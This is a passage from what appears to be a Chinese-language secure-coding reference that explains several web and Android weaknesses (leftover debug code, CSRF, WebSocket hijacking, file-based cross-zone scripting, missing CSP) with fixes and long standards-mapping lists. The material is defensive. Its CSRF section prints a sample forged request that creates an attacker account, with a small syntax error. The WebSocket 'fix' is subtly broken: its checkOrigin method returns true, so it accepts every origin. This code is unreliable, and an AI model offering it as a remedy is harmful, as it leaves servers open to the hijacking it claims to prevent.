<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SC-4 Information in Shared Resources (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.4 Sensitive Private Data, 8.3.6 Sensitive Private Data </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.4, Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.4, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3230.2 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3230.2 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3230.2 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3230.2 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3230.2 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3230.2 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3230.2 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Android-Bad-Practices-Leftover-Debug-Code"><a href="#Android-Bad-Practices-Leftover-Debug-Code" class="headerlink" title="Android Bad Practices: Leftover Debug Code"></a>Android Bad Practices: Leftover Debug Code</h4><h5 id="ABSTRACT-2"><a href="#ABSTRACT-2" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试代码可能影响性能或将敏感数据泄漏给攻击者。</p>
<h5 id="EXPLANATION-2"><a href="#EXPLANATION-2" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发过程中一般会为了调试或测试目的增加一些“后门”代码，这些代码不会随应用程序一起提供或部署。 如果这类调试代码无意中被保留在应用程序中，则会导致应用程序向计划外的交互模式开放。 这些后门入口点很容易产生安全隐患，因为它们不在当初的设计或者测试的考虑之内，并且不会出现在应用程序设计中的操作环境里。</p>
<h5 id="RECOMMENDATIONS-2"><a href="#RECOMMENDATIONS-2" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>务必在部署应用程序的产品版之前删除调试代码。 无论是否存在直接的安全威胁，一旦早期开发阶段结束，就没有任何理由将这样的代码保留在应用程序中。</p>
<h5 id="REFERENCES-2"><a href="#REFERENCES-2" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 489 </p>
<p>[2] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[3] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.2.2 Dependency, 14.3.2 Unintended Security Disclosure Requirements </p>
<p>[4] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<h4 id="Cross-Site-Request-Forgery"><a href="#Cross-Site-Request-Forgery" class="headerlink" title="Cross-Site Request Forgery"></a>Cross-Site Request Forgery</h4><h5 id="ABSTRACT-3"><a href="#ABSTRACT-3" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTTP 请求必须包含用户特有的机密，以防止攻击者发出未经授权的请求。</p>
<h5 id="EXPLANATION-3"><a href="#EXPLANATION-3" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>跨站点伪装请求 (CSRF) 漏洞会在以下情况下发生：</p>
<ol>
<li><p>Web 应用程序使用会话 cookie。</p>
</li>
<li><p>应用程序未验证请求是否经过用户同意便处理 HTTP 请求。</p>
</li>
</ol>
<p>Nonce 是随消息一起发送的加密随机值，可防止 replay 攻击。如果该请求未包含证明其来源的 nonce，则处理该请求的代码将易受到 CSRF 攻击（除非它并未更改应用程序的状态）。这意味着使用会话 cookie 的 Web 应用程序必须采取特殊的预防措施，确保攻击者无法诱骗用户提交伪请求。假设有一个 Web 应用程序，它允许管理员创建新帐户，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, &quot;/new_user&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_username);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_passwd);</span><br><span class="line"></span><br><span class="line">rb.sendRequest(body, new NewAccountCallback(callback));</span><br></pre></td></tr></table></figure>
<p>攻击者可以设置一个包含以下代码的恶意网站。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, &quot;http://www.example.com/new_user&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;attacker&quot;;</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;haha&quot;);</span><br><span class="line"></span><br><span class="line">rb.sendRequest(body, new NewAccountCallback(callback));</span><br></pre></td></tr></table></figure>
<p>如果 example.com 的管理员在网站上具有活动会话时访问了恶意页面，则会在毫不知情的情况下为攻击者创建一个帐户。这就是 CSRF 攻击。正是由于该应用程序无法确定请求的来源，才有可能受到 CSRF 攻击。任何请求都有可能是用户选定的合法操作，也有可能是攻击者设置的伪操作。攻击者无法查看伪请求生成的网页，因此，这种攻击技术仅适用于篡改应用程序状态的请求。</p>
<p>如果应用程序通过 URL 传递会话标识符（而不是 cookie），则不会出现 CSRF 问题，因为攻击者无法访问会话标识符，也无法在伪请求中包含会话标识符。</p>
<p>CSRF 在 2007 OWASP Top 10 排行榜上名列第 5。</p>
<h5 id="RECOMMENDATIONS-3"><a href="#RECOMMENDATIONS-3" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用会话 cookie 的应用程序必须在每个表单发布中包含几条信息，以便后端代码可以用来验证请求的来源。其中一种方法是包含随机请求标识符或 nonce，如下所示：</p>
<p>  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, “/new_user”);</p>
<p>  body = addToPost(body, new_username);</p>
<p>  body = addToPost(body, new_passwd);</p>
<p>  body = addToPost(body, request_id);</p>
<p>  rb.sendRequest(body, new NewAccountCallback(callback));</p>
<p>这样，后端逻辑可先验证请求标识符，然后再处理其他表单数据。如果可能，每个服务器请求的请求标识符都应该是唯一的，而不是在特定会话的各个请求之间共享。对于会话标识符而言，攻击者越难猜出请求标识符，则越难成功进行 CSRF 攻击。标记不应能够轻松猜出，它应以保护会话标记相同的方法得到保护，例如使用 SSLv3。</p>
<p>其他缓解技术还包括：</p>
<p>框架保护：大多数现代化的 Web 应用框架都嵌入了 CSRF 保护，它们将自动包含并验证 CSRF 标记。</p>
<p>使用质询-响应控制：强制客户响应由服务器发送的质询是应对 CSRF 的强有力防御方法。可以用于此目的的一些质询如下：CAPTCHA、密码重新验证和一次性标记。</p>
<p>检查 HTTP Referer/原始标题：攻击者在执行 CSRF 攻击时无法冒仿这些标题。这使这些标题可以用于预防 CSRF 攻击。</p>
<p>再次提交会话 Cookie：除了实际的会话 ID Cookie 外，将会话 ID Cookie 作为隐藏表单值发送是预防 CSRF 攻击的有效防护方法。服务器在处理其余表单数据之前，会先检查这些值，以确保它们完全相同。如果攻击者代表用户提交表单，他将无法根据同源策略修改会话 ID Cookie 值。</p>
<p>限制会话的有效期：当通过 CSRF 攻击访问受保护的资源时，只有当作为攻击一部分发送的会话 ID 在服务器上仍然有效时，攻击才会生效。限制会话的有效期将降低攻击成功的可能性。</p>
<p>这里所描述的技术可以使用 XSS 攻击破解。有效的 CSRF 缓解包括 XSS 缓解技术。</p>
<h5 id="REFERENCES-3"><a href="#REFERENCES-3" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</p>
<p>[2] OWASP OWASP Top 10</p>
<p>[3] OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 352</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A5 Cross Site Request Forgery (CSRF)</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A5 Cross-Site Request Forgery (CSRF)</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A8 Cross-Site Request Forgery (CSRF)</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.9</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.9</p>
<p>[15] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 352</p>
<p>[16] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 352</p>
<p>[17] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 352</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3585 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3585 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3585 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3585 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3585 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3585 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3585 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Request Forgery</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Request Forgery (WASC-09)</p>
<h4 id="Cross-Site-WebSocket-Hijacking"><a href="#Cross-Site-WebSocket-Hijacking" class="headerlink" title="Cross-Site WebSocket Hijacking"></a>Cross-Site WebSocket Hijacking</h4><h5 id="ABSTRACT-4"><a href="#ABSTRACT-4" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>服务器无法验证请求源，因此可以接收由攻击者用于劫持攻击双向 WebSocket 连接的跨域请求。</p>
<h5 id="EXPLANATION-4"><a href="#EXPLANATION-4" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当用户受诱使访问恶意站点时，该站点将与合法的后端站点建立 WebSocket 连接，这时将发生跨站 WebSocket 劫持。用于请求服务器更新到 WebSocket 协议的初始 HTTP 请求是一个常规 HTTP 请求，因此浏览器将发送任何绑定到目标域的 cookie，包括任何会话 cookie。如果服务器无法验证 Origin 头文件，它将允许任何恶意站点模拟用户并在用户不知情的情况下建立双向 WebSocket 连接。</p>
<h5 id="RECOMMENDATIONS-4"><a href="#RECOMMENDATIONS-4" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了避免 WebSocket 服务器接受跨域请求，请确保服务器验证请求 Origin 头文件。为了在 Java JSR 356 中执行此操作，应强制服务器在请求句柄中要求相同的源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import javax.websocket.server.ServerEndpointConfig.Configurator;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class EndpointConfigurator extends Configurator &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line"></span><br><span class="line"> public boolean checkOrigin(String originHeaderValue) &#123;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-4"><a href="#REFERENCES-4" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Christian Schneider Cross-Site WebSocket Hijacking</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 352</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A5 Cross Site Request Forgery (CSRF)</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A5 Cross-Site Request Forgery (CSRF)</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A8 Cross-Site Request Forgery (CSRF)</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.9</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.9</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.9</p>
<p>[13] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 352</p>
<p>[14] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 352</p>
<p>[15] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 352</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3585 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3585 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3585 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3585 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3585 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3585 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3585 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Request Forgery</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Request Forgery (WASC-09)</p>
<h4 id="File-Based-Cross-Zone-Scripting"><a href="#File-Based-Cross-Zone-Scripting" class="headerlink" title="File Based Cross-Zone Scripting"></a>File Based Cross-Zone Scripting</h4><h5 id="ABSTRACT-5"><a href="#ABSTRACT-5" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果加载一个文件可能导致在应用程序上下文中运行不可信赖的脚本，则是很危险的。</p>
<h5 id="EXPLANATION-5"><a href="#EXPLANATION-5" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下条件时会发生 File Based Cross Zone Scripting 漏洞：</p>
<ol>
<li><p>加载一个文件，这可能会允许在您的应用程序中运行脚本</p>
</li>
<li><p>加载的脚本采用与运行的应用程序一样的来源。</p>
</li>
</ol>
<p>当满足这两个条件时，可以实现一系列攻击，尤其是当其他各方根据信息是否来自您的应用程序范围内来确定信任时。</p>
<p>例 1：以下代码使用 Android WebView 以便在本地加载文件：</p>
<p>…</p>
<p>myWebView.loadUrl(“file:/android_asset/www/index.html”); … 在上面的示例中，Android WebView 呈现器将使用 loadUrl() 通过以 “file:” 开头的 URL 加载的一切内容视为来源相同。</p>
<p>当从文件进行加载时，攻击者可以通过几种典型方法来利用 File Based Cross-Zone Scripting 漏洞：</p>
<ul>
<li><p>本地文件可能受可将脚本注入该文件的攻击者操纵。 这将取决于文件权限、文件所在位置，或者文件先保存再加载的竞争条件（可能有供进行修改的时间段）。</p>
</li>
<li><p>文件可能会调出到外部资源。 当加载的文件从外部资源检索脚本时，可能会发生这种情况。</p>
</li>
</ul>
<p>例 2：以下代码查看外部数据源，以确定它应该运行的 JavaScript。</p>
<p> <code>&lt;script src=&quot;http://www.example.com/js/fancyWidget.js&quot;/&gt;</code></p>
<p>在上面的示例中，使用了不安全的协议，这可能会允许恶意操作者修改所生成的脚本。或者，可能会执行其他攻击，以将计算机重新路由到攻击者的站点。</p>
<ul>
<li>加载的文件可能包含 cross-site scripting 漏洞。</li>
</ul>
<p>如果所加载的文件能够注入代码，则注入的代码也许能够在您的应用程序上下文中运行。这不一定是注入 JavaScript 的能力，而仅仅能够注入 HTML 也可以实现涂改或拒绝服务攻击。</p>
<h5 id="RECOMMENDATIONS-5"><a href="#RECOMMENDATIONS-5" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿加载文件，以免在您的应用程序上下文中运行脚本。当绝对不会有其他选择时，应验证该文件具有正确的权限，以确保该文件不能被攻击者修改，并且最好使用某种方法来验证该文件仅执行部分操作。 作为一种额外保护措施，最好禁用 JavaScript，这将限制攻击者在您的应用程序上下文中运行代码的范围。</p>
<h5 id="REFERENCES-5"><a href="#REFERENCES-5" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Erika Chin and David Wagner Bifocals: Analyzing WebView Vulnerabilities in Android Applications</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="HTML5-Missing-Content-Security-Policy"><a href="#HTML5-Missing-Content-Security-Policy" class="headerlink" title="HTML5: Missing Content Security Policy"></a>HTML5: Missing Content Security Policy</h4><h5 id="ABSTRACT-6"><a href="#ABSTRACT-6" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未配置内容安全策略 (CSP)。</p>
<h5 id="EXPLANATION-6"><a href="#EXPLANATION-6" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，允许开发人员规定站点可从哪些域中加载内容，或呈现在 Web 浏览器中时向哪些域发起连接。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。 </p>
<p>默认情况下，Spring Security 和其他框架不会添加内容安全策略标头。Web 应用程序作者必须声明一或多项安全策略，以针对受保护资源强制实施或监控，从而从额外的安全层获益。</p>
<h5 id="RECOMMENDATIONS-6"><a href="#RECOMMENDATIONS-6" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置内容安全策略以缓解可能的注入漏洞。</p>
<p>示例：以下代码在受 Spring Security 保护的应用程序中设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot; request-matcher=&quot;regex&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;[policy here]&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<p>内容安全策略并不用于解决所有内容注入漏洞，而是利用 CSP 来减少由内容注入攻击造成的损害。应定期执行防范编码实践，例如输入验证和输出编码。</p>
<h5 id="REFERENCES-6"><a href="#REFERENCES-6" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 1173 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
